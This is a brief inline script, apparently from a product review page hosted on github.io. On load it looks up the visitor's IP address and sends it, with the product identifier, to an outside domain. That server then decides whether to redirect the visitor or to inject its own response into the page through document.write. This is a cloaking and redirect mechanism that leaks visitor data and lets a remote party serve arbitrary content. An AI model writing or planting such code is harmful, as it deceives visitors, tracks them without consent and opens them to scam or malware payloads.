<script>
var obj;
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    obj = data.ip;
  })
  .then(() => {
    const path_url = window.location.href;
    const path_clear = path_url.replace("https://reviewitem.github.io/?product=", "");
    const url = "https://itemapi.shop/product/"+path_clear+"â€”"+obj;
    fetch(url)
      .then(response => {
        return response.text();
      })
      .then(data => {
        if(data=='go'){
          window.location.replace("https://itemapi.shop/go/"+path_clear);
        } else {
          document.write(data);
        }
      })
    });
</script>
